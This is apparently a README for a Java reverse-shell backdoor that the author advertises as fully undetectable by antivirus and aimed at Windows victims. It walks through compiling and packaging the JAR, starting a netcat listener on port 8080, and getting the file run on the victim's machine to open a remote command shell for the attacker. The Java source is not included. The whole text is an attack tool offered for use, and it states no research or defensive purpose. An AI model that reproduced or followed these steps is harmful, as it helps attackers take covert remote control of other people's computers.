This is a Java based Completely FUD backdoor reverse shell, for Windows XP,Vista,7,8.x,10 , coded entirely in java.

This project was developed using openjdk version "11.0.3", but the Libraries used in this project dates back from JDK 1.0 release, thus, this will work on any version of Java. 
NB: the victim should have either the same version of Java or a few notches under, installed on the system, to avoid unwanted JNI errors.
This ideally should not be an issue as most users update their JRE runtime , either manually or is set to Auto update (which is most common).

To compile the file , simply run javac connectback.java.
This will create the .class file.
Create a manifest file, as per the JDK version on your device.
Filename : connectback.mf
Format:

Manifest-Version: 11.0.3
Main-Class: connectback

Now This can be packed into a .JAR executable file using :jar cmf connectback.mf connectback.jar connectback.class connectback.java

Start a netcat listner using nc -lvp 8080 ( I've used port 8080 as my listening port)

Port the .JAR file to the windows machine and execute it either by using java -jar connectback.jar or simply double clicking on the file , and you should instantly get your reverse shell on the attacker machine.
Once the CMD prompt appears on the Linux/kali/attacker system, hit enter once , on the cmd prompt and then type in the desired commands.
This ,you will have to repeat everytime , you type in a command.
This is NOT a bug, but the way the java libraries interact with netcat.

Cheers
#Captain_Nemo

connectback

https://www.youtube.com/watch?v=BaPRKLP9B_4
